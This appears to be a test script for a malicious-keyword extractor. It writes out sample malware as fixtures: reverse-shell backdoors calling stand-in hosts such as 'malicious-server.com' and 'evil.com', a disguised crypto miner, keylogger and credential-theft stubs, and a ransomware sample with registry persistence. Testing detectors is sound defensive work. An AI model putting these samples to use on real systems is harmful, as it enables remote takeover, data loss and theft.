#!/usr/bin/env python3
"""
Test script for the malicious keyword extraction functionality.
"""

import os
import tempfile
import sys

# Add the crawler directory to the Python path
sys.path.append(os.path.join(os.path.dirname(__file__), 'crawler'))

from keyword_extractor import MaliciousKeywordExtractor

def create_test_repository():
    """
    Create a temporary test repository with various code files containing
    both malicious and benign keywords for testing.
    """
    test_repo = tempfile.mkdtemp(prefix="test_repo_")
    
    # Create test files with different types of content
    test_files = {
        "legitimate_app.py": """
#!/usr/bin/env python3
import requests
import json

def main():
    url = "https://api.example.com/data"
    response = requests.get(url)
    data = response.json()
    print(f"Received {len(data)} records")

if __name__ == "__main__":
    main()
""",
        "suspicious_script.py": """
import subprocess
import socket
import base64

def create_backdoor():
    host = "malicious-server.com"
    port = 4444
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    while True:
        command = sock.recv(1024).decode()
        if command == 'exit':
            break
        
        result = subprocess.run(command, shell=True, capture_output=True)
        encoded_output = base64.b64encode(result.stdout).decode()
        sock.send(encoded_output.encode())

def keylogger():
    import pynput
    from pynput import keyboard
    
    def on_press(key):
        with open("keylog.txt", "a") as f:
            f.write(str(key))

def steal_credentials():
    import os
    browser_paths = [
        "Chrome/User Data/Default/Login Data",
        "Firefox/Profiles/*.default/logins.json"
    ]
    
    for path in browser_paths:
        # Extract passwords and send to C2 server
        pass

if __name__ == "__main__":
    create_backdoor()
    keylogger()
    steal_credentials()
""",
        "crypto_miner.js": """
const crypto = require('crypto');
const WebSocket = require('ws');

class CryptoMiner {
    constructor() {
        this.pool = "mining-pool.evil.com";
        this.wallet = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
    }
    
    async mine() {
        while (true) {
            const nonce = crypto.randomBytes(32);
            const hash = crypto.createHash('sha256').update(nonce).digest('hex');
            
            if (hash.startsWith('0000')) {
                this.submitHash(hash);
            }
        }
    }
    
    submitHash(hash) {
        const ws = new WebSocket(`ws://${this.pool}/submit`);
        ws.send(JSON.stringify({
            hash: hash,
            wallet: this.wallet
        }));
    }
    
    hideMiner() {
        // Obfuscate process name
        process.title = "svchost.exe";
        
        // Hide from task manager
        const { spawn } = require('child_process');
        spawn(process.argv[0], process.argv.slice(1), {
            detached: true,
            stdio: 'ignore'
        }).unref();
    }
}

const miner = new CryptoMiner();
miner.hideMiner();
miner.mine();
""",
        "ransomware.cpp": """
#include <iostream>
#include <filesystem>
#include <fstream>
#include <openssl/aes.h>

class Ransomware {
private:
    std::string encryption_key = "my_secret_key_123";
    std::string ransom_note = "Your files have been encrypted! Pay bitcoin to decrypt!";
    
public:
    void encrypt_files() {
        for (auto& file : std::filesystem::recursive_directory_iterator("C:\\\\Users")) {
            if (file.is_regular_file()) {
                encrypt_file(file.path());
            }
        }
    }
    
    void encrypt_file(const std::string& filepath) {
        std::ifstream input(filepath, std::ios::binary);
        std::string content((std::istreambuf_iterator<char>(input)),
                           std::istreambuf_iterator<char>());
        
        // AES encryption here
        std::string encrypted = aes_encrypt(content);
        
        std::ofstream output(filepath + ".encrypted", std::ios::binary);
        output << encrypted;
        
        std::filesystem::remove(filepath);
    }
    
    std::string aes_encrypt(const std::string& data) {
        // Simplified encryption simulation
        return data + "_encrypted";
    }
    
    void drop_ransom_note() {
        std::ofstream note("RANSOM_NOTE.txt");
        note << ransom_note;
        note << "\\nBitcoin address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2";
        note << "\\nTor contact: darkweb_contact.onion";
    }
    
    void persistence() {
        // Add to startup registry
        system("reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v malware /d C:\\\\malware.exe");
    }
};

int main() {
    Ransomware r;
    r.encrypt_files();
    r.drop_ransom_note();
    r.persistence();
    return 0;
}
""",
        "benign_utility.py": """
import argparse
import logging

def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

def process_data(input_file, output_file):
    try:
        with open(input_file, 'r') as f:
            data = f.read()
        
        processed = data.upper()
        
        with open(output_file, 'w') as f:
            f.write(processed)
            
        logging.info(f"Successfully processed {input_file} -> {output_file}")
        
    except Exception as e:
        logging.error(f"Error processing file: {e}")

def main():
    parser = argparse.ArgumentParser(description="Text processing utility")
    parser.add_argument("input", help="Input file path")
    parser.add_argument("output", help="Output file path")
    
    args = parser.parse_args()
    
    setup_logging()
    process_data(args.input, args.output)

if __name__ == "__main__":
    main()
""",
        "README.md": """
# Test Repository

This is a test repository for keyword extraction testing.

## Files

- legitimate_app.py: Normal application
- suspicious_script.py: Contains malicious keywords
- crypto_miner.js: Cryptocurrency mining script
- ransomware.cpp: File encryption malware
- benign_utility.py: Legitimate utility script
"""
    }
    
    # Write test files
    for filename, content in test_files.items():
        filepath = os.path.join(test_repo, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
    
    return test_repo

def test_keyword_extraction():
    """Test the keyword extraction functionality."""
    print("Testing Malicious Keyword Extraction")
    print("=" * 40)
    
    # Create test repository
    test_repo = create_test_repository()
    print("Created test repository: " + test_repo)
    
    try:
        # Initialize extractor
        extractor = MaliciousKeywordExtractor()
        
        # Extract keywords
        print("Extracting keywords...")
        keywords_data = extractor.extract_keywords_from_repository(test_repo)
        
        # Verify results
        assert keywords_data, "No keywords data returned"
        assert keywords_data['total_files_processed'] > 0, "No files processed"
        assert keywords_data['total_keywords_extracted'] > 0, "No keywords extracted"
        
        print("[OK] Files processed: " + str(keywords_data['total_files_processed']))
        print("[OK] Total keywords: " + str(keywords_data['total_keywords_extracted']))
        print("[OK] Unique keywords: " + str(keywords_data['unique_keywords']))
        print("[OK] Malicious score: " + str(keywords_data['malicious_score']))
        
        # Check for expected malicious keywords
        malicious_keywords = keywords_data.get('malicious_keywords', {})
        expected_malicious = ['backdoor', 'keylogger', 'steal', 'ransomware', 'encrypt', 'bitcoin', 'malware']
        found_malicious = []
        
        for expected in expected_malicious:
            if any(expected in keyword.lower() for keyword in malicious_keywords.keys()):
                found_malicious.append(expected)
        
        print("[OK] Expected malicious keywords found: " + str(found_malicious))
        
        # Verify malicious score is reasonable
        if keywords_data['malicious_score'] > 0.1:
            print("[OK] Malicious score (" + str(keywords_data['malicious_score']) + ") indicates suspicious content")
        else:
            print("[WARN] Malicious score (" + str(keywords_data['malicious_score']) + ") is lower than expected")
        
        # Display top malicious keywords
        if malicious_keywords:
            print("\nTop Malicious Keywords Found:")
            sorted_malicious = sorted(malicious_keywords.items(), key=lambda x: x[1], reverse=True)
            for keyword, freq in sorted_malicious[:10]:
                print("  " + keyword + ": " + str(freq))
        
        print("\n[PASS] All tests passed!")
        
    except Exception as e:
        print("[FAIL] Test failed: " + str(e))
        raise
    
    finally:
        # Cleanup
        import shutil
        shutil.rmtree(test_repo, ignore_errors=True)
        print("Cleaned up test repository: " + test_repo)

def test_individual_components():
    """Test individual components of the keyword extractor."""
    print("\nTesting Individual Components")
    print("-" * 30)
    
    extractor = MaliciousKeywordExtractor()
    
    # Test keyword extraction from code
    test_code = """
    import socket
    def create_backdoor():
        sock = socket.socket()
        sock.connect(("evil.com", 1337))
        while True:
            cmd = sock.recv(1024)
            result = subprocess.run(cmd, shell=True)
    """
    
    keywords = extractor.extract_keywords_from_code(test_code, '.py')
    print("[OK] Extracted " + str(len(keywords)) + " keywords from test code")
    
    # Test malicious pattern detection
    test_keywords = ['backdoor', 'keylogger', 'normal_function', 'encrypt_data', 'legitimate_app']
    malicious_found = []
    
    for keyword in test_keywords:
        if extractor._is_malicious_pattern(keyword):
            malicious_found.append(keyword)
    
    print("[OK] Identified malicious patterns: " + str(malicious_found))
    
    # Test keyword filtering
    test_tokens = ['and', 'or', 'backdoor', 'a', 'very_long_token_that_should_be_filtered', '123', 'legitimate_function']
    valid_keywords = []
    
    for token in test_tokens:
        normalized = extractor._normalize_token(token)
        if normalized and extractor._is_valid_keyword(normalized):
            valid_keywords.append(normalized)
    
    print("[OK] Valid keywords after filtering: " + str(valid_keywords))
    
    print("[PASS] Component tests completed!")

if __name__ == "__main__":
    test_keyword_extraction()
    test_individual_components()
    print("\n[SUCCESS] All tests completed successfully!")
